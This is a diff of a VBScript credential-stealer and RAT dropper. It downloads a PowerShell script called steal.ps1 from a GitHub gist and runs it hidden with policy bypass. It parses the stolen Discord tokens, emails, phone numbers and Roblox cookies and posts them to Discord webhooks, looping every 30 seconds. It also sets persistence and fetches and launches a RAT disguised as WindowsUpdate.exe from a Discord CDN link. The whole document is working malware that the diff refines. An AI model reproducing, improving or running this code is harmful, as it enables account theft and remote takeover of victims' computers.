@@ -23,8 +23,9 @@ lastToken = ""
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 
-' Grabs Token & Cookie, sends Persistence
-Call RunPS1(WH, True) 
+' Grabs Token & Cookie, sends to WH
+Call GrabTokens(WH) 
+Call Persistence
 
 ' RAT Sequence
 Call DropRAT(WH)
@@ -37,102 +38,88 @@ Do
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
     Call IP(RE_WH)
     
-    ' Grabs NEW Token / Cookie and sends to RE_WH (ignores Persistence)
-    Call RunPS1(RE_WH, False)
+    ' Grabs NEW Token / Cookie and sends to RE_WH
+    Call GrabTokens(RE_WH)
     
     Call SleepSeconds(30)
 Loop
 
 window.close()
 
-' --- PS1 EXECUTION & PARSING ---
-Sub RunPS1(targetWH, isLogs)
-    Dim xh, psData, psf, tf, cp, raw, lines, l, p, sz
-    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+' --- GRAB TOKENS ---
+Sub GrabTokens(targetWH)
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    
     xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/e8ec840166a2cb67f319619fab32ed0a5cdd7f39/steal.ps1", False
     xh.Send
-    If xh.Status = 200 Then psData = xh.responseText
+    If xh.Status <> 200 Then Exit Sub
+    Dim pc: pc = xh.responseText
+    If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
     
-    If Len(psData) > 100 Then
-        psf = TmpFile("steal.ps1")
-        WriteFile psf, psData
-
-        tf = TmpFile("steal_result.txt")
-        fso.DeleteFile tf, True
-
-        sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
-
-        Dim waited : waited = 0
-        Do
-            Call SleepSeconds(2)
-            waited = waited + 2
-            If fso.FileExists(tf) Then
-                sz = 0
-                On Error Resume Next
-                sz = fso.GetFile(tf).Size
-                On Error GoTo 0
-                If sz > 10 Then Exit Do
-            End If
-        Loop While waited < 30
-
+    Dim psf: psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+    
+    Dim tf: tf = TmpFile("steal_result.txt")
+    
+    ' Wait for file to populate
+    Dim waited : waited = 0
+    Do
+        Call SleepSeconds(2)
+        waited = waited + 2
         If fso.FileExists(tf) Then
-            cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
+            Dim sz : sz = 0
             On Error Resume Next
-            fso.CopyFile tf, cp, True
+            sz = fso.GetFile(tf).Size
             On Error GoTo 0
-            If Not fso.FileExists(cp) Then cp = tf
+            If sz > 10 Then Exit Do
+        End If
+    Loop While waited < 30
 
-            raw = ReadFile(cp)
-            If cp <> tf Then fso.DeleteFile cp, True
-            
-            If Len(raw) > 10 Then
-                If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
-                raw = Replace(raw, vbCrLf, vbLf)
-                raw = Replace(raw, vbCr, vbLf)
-
-                lines = Split(raw, vbLf)
-                For Each l In lines
-                    l = Trim(l)
-                    If Left(l, 8) = "DISCORD|" Then
-                        p = Split(Mid(l, 9), "|")
-                        If UBound(p) >= 4 Then
-                            If p(4) <> lastToken Then
-                                lastToken = p(4)
-                                Dim info: info = "**User:** " & p(0) & vbCrLf
-                                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                                info = info & "**Token:** " & p(4)
-                                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
-                            End If
-                        End If
-                    ElseIf Left(l, 9) = "ROBLOXMS|" Then
-                        Dim c1: c1 = Mid(l, 10)
-                        If Len(c1) > 20 And c1 <> lastCookie Then
-                            lastCookie = c1
-                            Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
-                        End If
-                    ElseIf Left(l, 8) = "ROBLOX|" Then
-                        Dim c2: c2 = Mid(l, 9)
-                        If Len(c2) > 20 And c2 <> lastCookie Then
-                            lastCookie = c2
-                            Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
-                        End If
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+    
+    If Len(raw) > 10 Then
+        If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
+        raw = Replace(raw, vbCrLf, vbLf)
+        raw = Replace(raw, vbCr, vbLf)
+        
+        Dim lines: lines = Split(raw, vbLf)
+        Dim l
+        For Each l In lines
+            l = Trim(l)
+            If Left(l, 8) = "DISCORD|" Then
+                Dim p: p = Split(Mid(l, 9), "|")
+                If UBound(p) >= 4 Then
+                    If p(4) <> lastToken Then
+                        lastToken = p(4)
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                     End If
-                Next
+                End If
+            ElseIf Left(l, 9) = "ROBLOXMS|" Then
+                Dim c1: c1 = Mid(l, 10)
+                If Len(c1) > 20 And c1 <> lastCookie Then
+                    lastCookie = c1
+                    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
+                End If
+            ElseIf Left(l, 8) = "ROBLOX|" Then
+                Dim c2: c2 = Mid(l, 9)
+                If Len(c2) > 20 And c2 <> lastCookie Then
+                    lastCookie = c2
+                    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+                End If
             End If
-        End If
-
-        If isLogs Then
-            Call Persistence
-        End If
+        Next
     End If
 End Sub
 
-' --- RAT DROP (1 Time Only) ---
+' --- RAT DROP ---
 Sub DropRAT(targetWH)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
@@ -142,7 +129,6 @@ Sub DropRAT(targetWH)
     Dim op : op = tPath & "\" & fname
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 1 COKET UI (Downloading & Launching)
     Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching RAT...", 10181046, targetWH)
     
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
@@ -155,7 +141,6 @@ Sub DropRAT(targetWH)
             Call RunCmd("""" & op & """")
             ratDropped = True
             Call SleepSeconds(2)
-            ' Size + Green Check UI (Downloaded & Launched)
             Call PostEmbedTo(":white_check_mark: RAT Launched", "Downloaded and launched RAT (" & fSizeMB & " MB)", 10181046, targetWH)
         Else
             Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes", 16711680, targetWH)
